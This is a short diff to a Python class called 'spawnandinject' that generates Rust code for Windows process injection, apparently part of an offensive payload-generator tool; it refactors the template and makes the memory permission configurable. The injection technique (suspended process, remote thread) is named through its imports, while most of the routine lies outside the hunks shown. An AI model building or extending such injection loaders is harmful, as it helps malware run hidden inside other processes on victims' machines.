@@ -20,8 +20,7 @@ class spawnandinject:
                 'use windows_sys::Win32::System::Threading::STARTUPINFOA;',
                 'use windows_sys::Win32::System::Threading::PROCESS_INFORMATION;',
                 'use windows_sys::Win32::System::Threading::CREATE_SUSPENDED;',
-                'use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READ;',
-                'use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READWRITE;',
+                f'use windows_sys::Win32::System::Memory::{self.memoryPermission};',
                 'use windows_sys::Win32::System::Threading::CreateRemoteThread;',
                 'use windows_sys::Win32::System::Threading::WaitForSingleObject;'
                 'use std::ffi::CString;',
@@ -32,16 +31,11 @@ class spawnandinject:
     def compilerOptions(self) -> list[str]:
         return ['windows-sys = { version = "0.61.2", features = ["Win32_System_Memory", "Win32_System_Threading", "Win32_Security", "Win32_Foundation", "Win32_System_Diagnostics_Debug", "Win32_System_Kernel", "Wdk_System", "Wdk_System_Threading"] }']
 
+    def codeblocks(self) -> str:
+        return """"""
+
     def template(self) -> str:
         return Template("""
-{imports}
-
-{codeblocks}
-
-
-fn main() {{
-
-    
     {transformers}
 
     unsafe
@@ -97,6 +91,4 @@ fn main() {{
         WaitForSingleObject(thread, 500);
     
     }}
-    
-}}
 """).substitute(target=self.target, memoryPermission=self.memoryPermission)
